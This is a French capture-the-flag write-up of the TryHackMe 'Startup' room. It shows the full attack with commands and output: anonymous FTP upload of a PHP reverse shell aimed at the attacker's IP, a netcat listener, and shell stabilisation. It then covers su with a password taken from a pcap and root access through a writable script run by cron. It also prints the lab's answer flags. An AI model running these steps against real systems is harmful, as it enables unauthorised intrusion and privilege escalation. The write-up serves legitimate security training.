# Startup #

## Task 1 Welcome to Spice Hut! ##

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo sh -c "echo '10.10.6.28 Spice.thm' >> /etc/hosts"
[sudo] Mot de passe de tim : 

im@kali:~/Bureau/tryhackme/write-up$ sudo nmap -A spice.thm -p-
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-06 15:37 CEST
Nmap scan report for spice.thm (10.10.6.28)
Host is up (0.033s latency).
rDNS record for 10.10.6.28: Spice.thm
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.9.228.66
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=8/6%OT=21%CT=1%CU=33936%PV=Y%DS=2%DC=T%G=Y%TM=610D3B54
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)OPS(
OS:O1=M506ST11NW6%O2=M506ST11NW6%O3=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST11
OS:NW6%O6=M506ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(
OS:R=Y%DF=Y%T=40%W=6903%O=M506NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT      ADDRESS
1   32.82 ms 10.9.0.1
2   32.96 ms Spice.thm (10.10.6.28)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.57 seconds

```

Le résultat du scan nous montre 3 services :
Le service FTP sur le port 21, l'accès anonymous fonctionne.    
Le service SSH sur le port 22.    
Le service HTTP sur le port 80.    

```bash
tim@kali:~/Bureau/tryhackme/write-up$ ftp spice.thm
Connected to Spice.thm.
220 (vsFTPd 3.0.3)
Name (spice.thm:tim): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
ftp> 
226 Directory send OK.

ftp> get important.jpg
local: important.jpg remote: important.jpg
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for important.jpg (251631 bytes).
226 Transfer complete.
251631 bytes received in 0.16 secs (1.5185 MB/s)

ftp> get notice.txt
local: notice.txt remote: notice.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for notice.txt (208 bytes).
226 Transfer complete.
208 bytes received in 0.00 secs (219.1208 kB/s)
ftp> get .test.log
local: .test.log remote: .test.log
200 PORT command successful. Consider using PASV.

150 Opening BINARY mode data connection for .test.log (5 bytes).
226 Transfer complete.
5 bytes received in 0.00 secs (77.5050 kB/s)

ftp> ls fps
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.

```

On se connect sur le service FTP, puis on récupère les fichiers.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ cat .test.log 
test

tim@kali:~/Bureau/tryhackme/write-up$ cat notice.txt
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.

im@kali:~/Bureau/tryhackme/write-up$ file important.jpg 
important.jpg: PNG image data, 735 x 458, 8-bit/color RGBA, non-interlaced

tim@kali:~/Bureau/tryhackme/write-up$ mv important.jpg important.png
```

On regarde dans les fichiers il rien dans .test.log     
Dans notices.txt il y a un message qui se plaint à propos d'un document téléversé.  
L'image n'est pas un image jpg mais une image en png.    

![page1](./Task1-01.png)

Sur la page principale on trouve pas grand chose.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ gobuster dir -u http://spice.thm -w /usr/share/dirb/wordlists/common.txt -q
/.htaccess            (Status: 403) [Size: 274]
/.hta                 (Status: 403) [Size: 274]
/.htpasswd            (Status: 403) [Size: 274]
/files                (Status: 301) [Size: 306] [--> http://spice.thm/files/]
/index.html           (Status: 200) [Size: 808]                              
/server-status        (Status: 403) [Size: 274]                 
```

![page2](./Task1-02.png)

Avec Gobuster on trouve un répertoire caché.  
Quand on va au répertoire caché on retrouve les fichiers FTP.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -nv
2021-08-06 16:29:19 URL:https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php [5491/5491] -> "php-reverse-shell.php" [1]

tim@kali:~/Bureau/tryhackme/write-up$ sed -i 's/127.0.0.1/10.9.228.66/g' php-reverse-shell.php 

tim@kali:~/Bureau/tryhackme/write-up$ ftp spice.thm
Connected to Spice.thm.
220 (vsFTPd 3.0.3)
Name (spice.thm:tim): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd ftp
250 Directory successfully changed.
ftp> put php-reverse-shell.php
local: php-reverse-shell.php remote: php-reverse-shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5493 bytes sent in 0.00 secs (46.7726 MB/s)
```

On télécharge un reverse shell en php.    
On configure le reverse shell.    
On téléverse le reverse shell dans le répertoire ftp.     

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc -lvnp 1234
listening on [any] 1234 ...

```

On écoute le port.

![page3](./Task1-03.png)

On le reverse shell.

```bash
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ cd /
$ ls
bin
boot
dev
etc
home
incidents
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
recipe.txt
root
run
sbin
snap
srv
sys
tmp
usr
vagrant
var
vmlinuz
vmlinuz.old
$ cat recipe.txt
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
```

A la racine on trouve un fichier recipe.txt    
On voit notre premier ingredient à l'intérieur du fichier.   

La réponse est : love

```bash
$ cd incidents
$ ls
suspicious.pcapng

$ python3 -m http.server

```

On voit un répertoire incidents avec un fichier suspicous.pcapng    
On lance un serveur HTTP pour récupérer le fichier.    

```bash
tim@kali:~/Bureau/tryhackme/write-up$ wget http://spice.thm:8000/suspicious.pcapng -nv
2021-08-06 17:08:34 URL:http://spice.thm:8000/suspicious.pcapng [31224/31224] -> "suspicious.pcapng" [1]
```

On récupère le fichier.   

![wireshark](./Task1-05.png)
![wireshark](./Task1-04.png)

On un filtre pour le port 4444.  
On fait un clique droit-\>suivre-\>Flux TCP     

On peut voire le mot de passe.   
Mot de passe : c4ntg3t3n0ughsp1c3     

**What are the contents of user.txt?**

```bash
$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@startup:/$ ls /home
ls /home
lennie
su lennie 
Password: c4ntg3t3n0ughsp1c3

lennie@startup:/$ 

cd /home/lennie
lennie@startup:~$ cat user.txt
cat user.txt
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
```

On stabilise le shell.   
Avec le mot de passe on le nom d'utilisateur on change d'utilisateur.   
Il reste plus que à lire le flag.     

La réponse : THM{03ce3d619b80ccbfb3b7fc81e46c0e79}   

**What are the contents of root.txt?**

```bash
cd scripts
lennie@startup:~/scripts$ ls
ls -al
total 16
drwxr-xr-x 2 root   root   4096 Nov 12  2020 .
drwx------ 4 lennie lennie 4096 Nov 12  2020 ..
-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root   root      1 Aug  6 16:43 startup_list.txt

lennie@startup:~/scripts$ cat planner.sh
cat planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh

ls -al /etc/print.sh
-rwx------ 1 lennie lennie 25 Nov 12  2020 /etc/print.sh
lennie@startup:~/scripts$ cat /etc/print.sh

cat /etc/print.sh
#!/bin/bash
echo "Done!"

echo "cat /root/root.txt > /home/lennie/powned.txt" >> /etc/print.sh


cat ../powned.txt
THM{f963aaa6a430f210222158ae15c3d76d}

```

On a un répertoire script avec script planner qui a les droits root.     
A l'intérieur du script on voit un fichier print.sh qui est exécuté.   
Ce fichier peut être modifié.   
On le modifie pour qu'il récupère le flag \/root\/root.txt    

```bash
tim@kali:~/Bureau/tryhackme/write-up$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64 -nv
2021-08-06 19:30:03 URL:https://github-releases.githubusercontent.com/120821432/d54f2200-c51c-11e9-8d82-f178cd27b2cb?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20210806%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20210806T172936Z&X-Amz-Expires=300&X-Amz-Signature=899760e2dc06c4a35c280de5be39015cddd886b86453f435d35d84e708444610&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=120821432&response-content-disposition=attachment%3B%20filename%3Dpspy64&response-content-type=application%2Foctet-stream [3078592/3078592] -> "pspy64" [1]

tim@kali:~/Bureau/tryhackme/write-up$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

lennie@startup:~$ wget http://10.9.228.66:8000/pspy64 -nv
wget http://10.9.228.66:8000/pspy64 -nv
2021-08-06 17:33:21 URL:http://10.9.228.66:8000/pspy64 [3078592/3078592] -> "pspy64" [1]

lennie@startup:~$ chmod +x pspy64
chmod +x pspy64
./pspy64
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
2021/08/06 17:39:06 CMD: UID=0    PID=3472   | pidof 
2021/08/06 17:40:01 CMD: UID=0    PID=3476   | /bin/bash /home/lennie/scripts/planner.sh 
2021/08/06 17:40:01 CMD: UID=0    PID=3475   | /bin/sh -c /home/lennie/scripts/planner.sh 
2021/08/06 17:40:01 CMD: UID=0    PID=3474   | /usr/sbin/CRON -f 
2021/08/06 17:41:01 CMD: UID=0    PID=3481   | /bin/bash /home/lennie/scripts/planner.sh 
2021/08/06 17:41:01 CMD: UID=0    PID=3480   | /bin/sh -c /home/lennie/scripts/planner.sh 
2021/08/06 17:41:01 CMD: UID=0    PID=3479   | /usr/sbin/CRON -f 
2021/08/06 17:42:01 CMD: UID=0    PID=3486   | /bin/bash /home/lennie/scripts/planner.sh 
2021/08/06 17:42:01 CMD: UID=0    PID=3485   | /bin/sh -c /home/lennie/scripts/planner.sh 
2021/08/06 17:42:01 CMD: UID=0    PID=3484   | /usr/sbin/CRON -f 
2021/08/06 17:43:01 CMD: UID=0    PID=3491   | /bin/bash /home/lennie/scripts/planner.sh 
2021/08/06 17:43:01 CMD: UID=0    PID=3490   | /bin/sh -c /home/lennie/scripts/planner.sh 
2021/08/06 17:43:01 CMD: UID=0    PID=3489   | /usr/sbin/CRON -f 

```

Avec pspy on voit que planner.sh est exécuter toute les minutes avec les droits root.   

La réponse est : THM{f963aaa6a430f210222158ae15c3d76d}      